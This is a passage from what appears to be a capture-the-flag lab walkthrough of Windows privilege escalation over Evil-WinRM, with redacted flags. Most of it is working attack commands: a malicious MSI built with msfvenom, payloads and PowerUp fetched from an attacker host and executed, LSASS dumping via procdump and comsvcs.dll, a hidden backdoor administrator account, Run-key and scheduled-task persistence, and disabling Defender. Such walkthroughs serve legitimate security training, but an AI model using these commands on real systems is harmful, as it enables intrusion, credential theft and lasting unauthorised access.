*Evil-WinRM* PS C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1

*Evil-WinRM* PS C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

**Both are set to 1 - System is vulnerable!**

**Exploitation**:
```bash
# From Kali, create malicious MSI
┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/x64/exec CMD='cmd.exe /c type C:\Windows\System32\config\systemprofile\msi_flag.txt > C:\msi_flag.txt' -f msi -o exploit.msi

# Transfer and execute
```

```powershell
*Evil-WinRM* PS C:\Temp> Invoke-WebRequest -Uri "http://192.168.148.99:8000/exploit.msi" -OutFile exploit.msi
*Evil-WinRM* PS C:\Temp> msiexec /quiet /qn /i exploit.msi

# Check for flag
*Evil-WinRM* PS C:\Temp> Get-Content C:\msi_flag.txt
FLAG{F*************3}
```

**FLAG 16 FOUND**: FLAG{F**********3} - AlwaysInstallElevated

### FLAG 17: Print Spooler Vulnerability

**Location**: Print Spooler directory  
**Difficulty**: Hard

```powershell
# Check Print Spooler status
*Evil-WinRM* PS C:\> Get-Service Spooler

Status   Name               DisplayName
------   ----               -----------
Running  Spooler            Print Spooler

# Check directory permissions
*Evil-WinRM* PS C:\> icacls "C:\Windows\System32\spool\drivers\color"

C:\Windows\System32\spool\drivers\color Everyone:(OI)(CI)F
                                         NT AUTHORITY\SYSTEM:(I)(OI)(CI)F
                                         BUILTIN\Administrators:(I)(OI)(CI)F

# Everyone has Full control - vulnerable!

# Check for flag
*Evil-WinRM* PS C:\> Get-Content "C:\Windows\System32\spool\drivers\color\printnightmare_flag.txt"
FLAG{A*************2}
```

**FLAG 17 FOUND**: FLAG{A**********2} - Print Spooler flag

**Real-World Impact**: This represents the PrintNightmare vulnerability (CVE-2021-34527) which allowed remote code execution on domain controllers!

---

## Phase 8: Registry and Configuration

### The Registry - Windows' Configuration Database

**Why Registry Matters**: The Windows Registry contains:
- System configuration
- User preferences
- Installed software info
- Credentials (encrypted and sometimes plaintext)
- Persistence mechanisms

### FLAG 19: SSH Configuration

**Location**: SSH authorized_keys  
**Difficulty**: Medium

```powershell
# Check SSH configuration
*Evil-WinRM* PS C:\> Get-Content C:\ProgramData\ssh\administrators_authorized_keys
```

**Output**:
```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7... overclock@vulnerable # FLAG{M************7}
```

**FLAG 19 FOUND**: FLAG{M**********7} - In SSH key comment

### FLAG 21: Scheduled Task Analysis

**Location**: VulnTask scheduled task  
**Difficulty**: Medium

```powershell
# List all scheduled tasks with details
*Evil-WinRM* PS C:\> Get-ScheduledTask | Where-Object {$_.TaskName -like "*Vuln*"}

TaskPath                                       TaskName   State
--------                                       --------   -----
\                                              VulnTask   Ready

# Get task details
#Start by looking through all scheduled tasks
Evil-WinRM* PS C:\> Get-ScheduledTask

# Found an interesting task "VulnTask"... Dig further
*Evil-WinRM* PS C:\> Get-ScheduledTask -TaskName VulnTask | Select-Object -ExpandProperty Actions

Id               :
Arguments        : /c echo FLAG{M************4} > C:\Public\taskflag.txt
Execute          : C:\Windows\System32\cmd.exe

# Run the task manually
*Evil-WinRM* PS C:\> Start-ScheduledTask -TaskName VulnTask

# Get the flag
*Evil-WinRM* PS C:\> Get-Content C:\Public\taskflag.txt
FLAG{M***********4}
```

**FLAG 21 FOUND**: FLAG{M**********4} - Scheduled task output

### FLAG 22: Registry HKLM

**Location**: HKLM registry  
**Difficulty**: Easy

```powershell
# Query specific registry key
*Evil-WinRM* PS C:\> reg query "HKLM\SOFTWARE\VulnApp" /v LicenseKey

HKEY_LOCAL_MACHINE\SOFTWARE\VulnApp
    LicenseKey    REG_SZ    FLAG{P**********0}
```

**FLAG 22 FOUND**: FLAG{P**********0} - Registry HKLM

### FLAG 23: Registry HKCU Run Key

**Location**: Current User Run key  
**Difficulty**: Medium

```powershell
# Check Run keys for persistence
*Evil-WinRM* PS C:\> reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    UpdaterFlag    REG_SZ    cmd /c echo FLAG{A*************1} > C:\Temp\run_flag.txt

# Execute the command
*Evil-WinRM* PS C:\> cmd /c echo FLAG{A**************1} > C:\Temp\run_flag.txt
*Evil-WinRM* PS C:\> Get-Content C:\Temp\run_flag.txt
FLAG{A************1}
```

**FLAG 23 FOUND**: FLAG{A**********1} - Registry Run key

### FLAG 24: Service Registry

**Location**: Service registry entry  
**Difficulty**: Hard

```powershell
# Query service-specific registry
*Evil-WinRM* PS C:\> reg query "HKLM\SYSTEM\CurrentControlSet\Services\VulnScanner" /v Flag

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VulnScanner
    Flag    REG_SZ    FLAG{P***********9}
```

**FLAG 24 FOUND**: FLAG{P**********9} - Service registry

### FLAG 6: RDP Certificate

**Location**: RDP configuration  
**Difficulty**: Medium

```powershell
# Check RDP certificate configuration
*Evil-WinRM* PS C:\> reg query "HKLM\System\CurrentControlSet\Control\Terminal Server" /v CertificateComment

HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server
    CertificateComment    REG_SZ    FLAG{G************6}
```

**FLAG 6 FOUND**: FLAG{G**********6} - RDP certificate comment

---

## Advanced Techniques and Alternative Approaches

### Living Off the Land Binaries (LOLBins)

**Why LOLBins?**: Using legitimate Windows binaries for malicious purposes avoids antivirus detection.

#### LSASS Dumping Without Mimikatz

```powershell
# Method 1: Task Manager (GUI)
# Right-click lsass.exe → Create dump file

# Method 2: ProcDump (Microsoft signed)
*Evil-WinRM* PS C:\Temp> .\procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Method 3: Comsvcs.dll
*Evil-WinRM* PS C:\Temp> rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\Temp\lsass.dmp full

# Transfer dump to Kali for offline analysis
# Use pypykatz or mimikatz on the dump file
```

### Automated Enumeration Scripts

#### Using WinPEAS

```powershell
# Download and run WinPEAS
*Evil-WinRM* PS C:\Temp> Invoke-WebRequest -Uri "http://192.168.148.99:8000/winPEASx64.exe" -OutFile wp.exe
*Evil-WinRM* PS C:\Temp> .\wp.exe systeminfo userinfo
```

**WinPEAS will find**:
- Unquoted service paths
- AlwaysInstallElevated
- Stored credentials
- Weak permissions
- Much more

#### Using PowerUp

```powershell
# Import PowerUp module
*Evil-WinRM* PS C:\Temp> IEX(New-Object Net.WebClient).downloadString('http://192.168.148.99:8000/PowerUp.ps1')

# Run all checks
*Evil-WinRM* PS C:\Temp> Invoke-AllChecks
```

### Persistence Techniques

#### Creating Backdoor User

```powershell
# Create hidden admin user
*Evil-WinRM* PS C:\> net user hacker Hacker123! /add
*Evil-WinRM* PS C:\> net localgroup administrators hacker /add

# Hide from login screen
*Evil-WinRM* PS C:\> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v hacker /t REG_DWORD /d 0 /f
```

#### Registry Persistence

```powershell
# Add Run key persistence
*Evil-WinRM* PS C:\> reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Temp\backdoor.exe" /f
```

#### Scheduled Task Persistence

```powershell
# Create persistent scheduled task
*Evil-WinRM* PS C:\> schtasks /create /sc minute /mo 5 /tn "SystemUpdate" /tr "C:\Temp\beacon.exe" /ru SYSTEM
```

---

## Troubleshooting Guide

### Common Issues and Solutions

#### Issue: SMB Access Denied
```bash
# Solution 1: Try different protocol versions
smbclient //192.168.148.101/share -U user --option='client min protocol=NT1'

# Solution 2: Use different tools
crackmapexec smb 192.168.148.101 -u user -p pass --shares

# Solution 3: Check for clock skew
ntpdate 192.168.148.101
```

#### Issue: Mimikatz Detected by Defender
```powershell
# Solution 1: Disable Defender (requires admin)
Set-MpPreference -DisableRealtimeMonitoring $true

# Solution 2: Use obfuscated version
# Rename mimikatz.exe to something else
# Use Invoke-Mimikatz PowerShell version

# Solution 3: Dump LSASS for offline analysis
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump [PID] C:\Temp\dump.dmp full
```

#### Issue: Service Won't Restart
```powershell
# Solution 1: Check dependencies
sc qdependencies ServiceName

# Solution 2: Force kill and restart
taskkill /F /IM service.exe
net start ServiceName

# Solution 3: Use WMI
Get-WmiObject -Class Win32_Service -Filter "Name='ServiceName'" | Invoke-WmiMethod -Name StartService
```

---

### Key Commands Reference Card

```powershell
# === Information Gathering ===
systeminfo                              # System information
whoami /all                            # Current user details
net user                               # List users
net localgroup administrators         # List admins
netstat -ano                          # Network connections
tasklist /v                           # Running processes

# === Service Enumeration ===
sc query                              # List services
wmic service list brief               # Service details
Get-Service | fl *                    # PowerShell service enum

# === Registry Search ===
reg query HKLM /s /f password         # Search for passwords
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"  # Startup programs

# === File Search ===
dir /s *pass* == *.config            # Search for password files
findstr /si password *.xml *.ini *.txt  # Search in files
where /r C:\ *.bak *.old            # Find backup files

# === Credential Extraction ===
cmdkey /list                         # List stored credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"  # Autologon

# === Privilege Escalation Checks ===
whoami /priv                         # Current privileges
schtasks /query /fo LIST /v          # Scheduled tasks
driverquery                          # List drivers
```
